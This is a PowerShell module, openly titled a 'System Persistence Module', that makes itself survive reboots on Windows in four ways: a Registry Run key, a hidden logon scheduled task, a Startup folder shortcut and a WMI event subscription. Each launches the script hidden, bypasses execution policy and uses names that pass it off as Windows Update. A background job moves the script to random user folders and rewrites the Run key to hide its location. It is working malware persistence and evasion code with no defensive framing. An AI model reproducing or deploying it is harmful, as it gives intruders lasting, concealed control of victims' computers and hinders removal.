<#
.SYNOPSIS
    System Persistence Module
.DESCRIPTION
    Establishes persistence mechanisms for system service
#>

function Set-SystemPersistence {
    param(
        [hashtable]$Config
    )
    
    try {
        $Success = $false
        
        # Method 1: Registry Run key
        if (Set-RegistryPersistence) {
            $Success = $true
        }
        
        # Method 2: Task Scheduler
        if (Set-TaskSchedulerPersistence) {
            $Success = $true
        }
        
        # Method 3: Startup folder
        if (Set-StartupFolderPersistence) {
            $Success = $true
        }
        
        # Method 4: WMI Event Subscription
        if (Set-WMIPersistence) {
            $Success = $true
        }
        
        return $Success
    }
    catch {
        Write-Error "Persistence setup failed: $($_.Exception.Message)"
        return $false
    }
}

function Set-RegistryPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $ServiceName = "WindowsUpdateService"
        
        # Create registry entry
        $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $Command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        
        Set-ItemProperty -Path $RegistryPath -Name $ServiceName -Value $Command -Force
        
        return $true
    }
    catch {
        return $false
    }
}

function Set-TaskSchedulerPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $TaskName = "Windows System Update"
        
        # Create scheduled task
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
        
        return $true
    }
    catch {
        return $false
    }
}

function Set-StartupFolderPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        
        if (-not (Test-Path $StartupPath)) {
            New-Item -ItemType Directory -Path $StartupPath -Force | Out-Null
        }
        
        $ShortcutPath = Join-Path $StartupPath "SystemUpdate.lnk"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        $Shortcut.WindowStyle = 7  # Minimized
        $Shortcut.Save()
        
        return $true
    }
    catch {
        return $false
    }
}

function Set-WMIPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $EventFilterName = "WindowsUpdateFilter"
        $EventConsumerName = "WindowsUpdateConsumer"
        $BindingName = "WindowsUpdateBinding"
        
        # Create WMI Event Filter
        $EventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            EventNameSpace = "root\cimv2"
            Name = $EventFilterName
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
            QueryLanguage = "WQL"
        }
        
        # Create WMI Event Consumer
        $EventConsumer = Set-WmiInstance -Class __EventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $EventConsumerName
            CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        }
        
        # Bind filter to consumer
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $EventFilter
            Consumer = $EventConsumer
        } | Out-Null
        
        return $true
    }
    catch {
        return $false
    }
}

function Start-PeriodicMovement {
    param(
        [int]$Interval = 600
    )
    
    Start-Job -ScriptBlock {
        param($Interval, $ScriptPath)
        
        while ($true) {
            Start-Sleep -Seconds $Interval
            
            try {
                # Move to random location
                $Locations = @(
                    "$env:TEMP",
                    "$env:USERPROFILE\Documents",
                    "$env:USERPROFILE\Downloads",
                    "$env:USERPROFILE\Desktop",
                    "$env:APPDATA\Local\Temp"
                )
                
                $TargetDir = $Locations | Get-Random
                $RandomName = "SystemUpdate" + (Get-Random -Minimum 1000 -Maximum 9999) + ".ps1"
                $TargetPath = Join-Path $TargetDir $RandomName
                
                Copy-Item -Path $ScriptPath -Destination $TargetPath -Force
                
                # Update registry entry with new path
                $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                $ServiceName = "WindowsUpdateService"
                $Command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TargetPath`" -Silent"
                Set-ItemProperty -Path $RegistryPath -Name $ServiceName -Value $Command -Force
                
                # Remove old file
                Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
                
            }
            catch {
                # Continue silently
            }
        }
    } -ArgumentList $Interval, $MyInvocation.MyCommand.Path | Out-Null
} 